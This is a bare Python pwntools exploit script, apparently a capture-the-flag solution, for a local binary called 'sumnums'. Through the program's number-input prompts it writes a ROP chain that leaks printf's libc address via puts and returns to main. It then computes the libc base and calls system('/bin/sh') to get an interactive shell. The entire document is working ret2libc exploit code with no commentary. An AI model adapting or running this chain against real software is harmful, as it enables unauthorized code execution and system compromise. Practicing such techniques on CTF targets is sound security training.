import pwn
import sys

elf = pwn.context.binary = pwn.ELF('./sumnums')
# pwn.context.terminal = ['terminator', '@', 'launch', '--keep-focus']

io = pwn.gdb.debug('./sumnums', gdbscript='''
continue
''')

io = elf.process()
rop = pwn.ROP(elf)
libc = elf.libc
retAddr = int("40101a",16)
popRDI = hex(rop.rdi.address)
putsPLT = hex(elf.plt.puts)
printfGOT = hex(elf.got.printf)
main = hex(elf.symbols.main)

#Leak address
for i in range(23):
    io.recv(100000).decode("utf-8")
    io.sendline((str(i).encode()))
    io.sendline(b'5')
io.sendline(b'23')
io.sendline(str(int(popRDI,16)).encode())
io.sendline(b'24')
io.sendline(str(int(printfGOT,16)).encode())
io.sendline(b'25')
io.sendline(str(int(putsPLT,16)).encode())
io.sendline(b'26')
io.sendline(str(int(main,16)).encode())
io.sendline(b'-1')

io.recvuntil(b'\n')
leakedAddr = pwn.u64(io.recvline().strip().ljust(8,b"\x00"))

# Payload
libc.address = leakedAddr - libc.symbols.printf
system = libc.symbols.system
binSH = next(libc.search(b'/bin/sh'))
# Padding
for i in range(23):
    io.recv(100000).decode("utf-8")
    io.sendline((str(i).encode()))
    io.sendline(b'5')

io.sendline(b'23')
io.sendline(str(int(popRDI,16)).encode())
io.sendline(b'24')
io.sendline(str(binSH).encode())
io.sendline(b'25')
io.sendline(str(retAddr).encode())
io.sendline(b'26')
io.sendline(str(system).encode())
io.sendline(b'27')
io.sendline(str(int("0x0",16)).encode())

io.sendline(b'-1')
io.recv(100000).decode("utf-8")
io.interactive()